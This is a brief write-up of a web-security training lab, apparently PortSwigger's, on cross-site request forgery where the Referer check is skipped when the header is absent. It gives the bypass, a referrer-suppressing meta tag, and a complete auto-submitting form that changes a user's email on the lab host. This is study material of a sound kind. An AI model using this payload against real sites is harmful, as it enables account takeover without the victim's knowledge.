## Lab: CSRF where Referer validation depends on header being present

Defense:
- Check Referer, but only when its available

Bypass:
- `<meta name="referrer" content="never">` 

```
<meta name="referrer" content="never">
<form method="POST" action="https://0a48006e03e5d08a815cfc9b00d100d6.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="hell@web-security-academy.net">
</form>
<script>
    document.forms[0].submit();
</script>
```